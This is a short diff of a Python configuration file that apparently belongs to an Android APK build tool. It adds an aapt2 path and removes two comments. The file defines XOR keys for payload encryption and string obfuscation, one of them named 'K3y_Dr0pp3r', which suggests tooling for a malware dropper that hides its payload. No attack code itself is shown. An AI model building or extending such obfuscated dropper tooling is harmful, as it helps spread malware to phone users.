@@ -13,6 +13,7 @@ BT_DIR        = os.path.join(TOOLS_DIR, "build-tools")
 APKSIGNER_BIN = os.path.join(BT_DIR, "apksigner")
 ZIPALIGN_BIN  = os.path.join(BT_DIR, "zipalign")
 D8_BIN        = os.path.join(BT_DIR, "d8")
+AAPT2_BIN     = os.path.join(BT_DIR, "aapt2")
 
 KEYSTORE_DIR  = os.path.join(TOOLS_DIR, "keystores")
 KEYSTORE_PATH = os.path.join(KEYSTORE_DIR, "default.p12")
@@ -36,10 +37,8 @@ PAYLOAD_XOR_KEY = bytes([
     0x2C, 0x48, 0x9E, 0x11, 0x73, 0xFA, 0x05, 0xB8,
 ])
 
-# String obfuscation key — 48 bytes, zyada entropy
 STRING_XOR_KEY = "K3y_Dr0pp3r_V5_XoR_2025_A9mQ2xLp7Rv4Tz8Wn1Yb6Hj3Fc0Dg5"
 
-# tools_encrypt.py ke liye
 PAYLOAD_KEY1 = bytes([
     0x5A, 0x1C, 0x3E, 0x7B, 0x92, 0x44, 0xAF, 0x08,
     0xD1, 0x66, 0x22, 0x9F, 0x0B, 0x35, 0xC7, 0x84,
